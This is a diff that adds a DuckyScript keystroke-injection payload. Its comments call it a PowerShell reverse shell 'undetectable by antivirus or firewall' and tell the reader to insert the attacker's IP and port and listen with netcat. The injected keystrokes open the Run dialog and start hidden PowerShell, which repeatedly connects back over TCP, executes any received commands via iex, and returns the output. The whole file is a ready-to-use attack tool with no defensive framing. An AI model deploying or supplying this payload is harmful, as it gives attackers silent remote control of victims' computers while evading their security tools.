@@ -1,0 +1,8 @@
+REM Powershell Reverse Shell, undetectable by antivirus or firewall
+REM Replace ip address and port in command with attacker ip address and port
+REM Open a session on the attacker machine by running this netcat command (replace port): netcat -l -p 8008
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -w hidden -noexit while($true){$sm=(New-Object Net.Sockets.TCPClient("127.0.0.1",8008)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes(("$(iex $d)`n$(pwd)> " 2>&1));$sm.Write($st,0,$st.Length)};start-sleep 60}
+ENTER
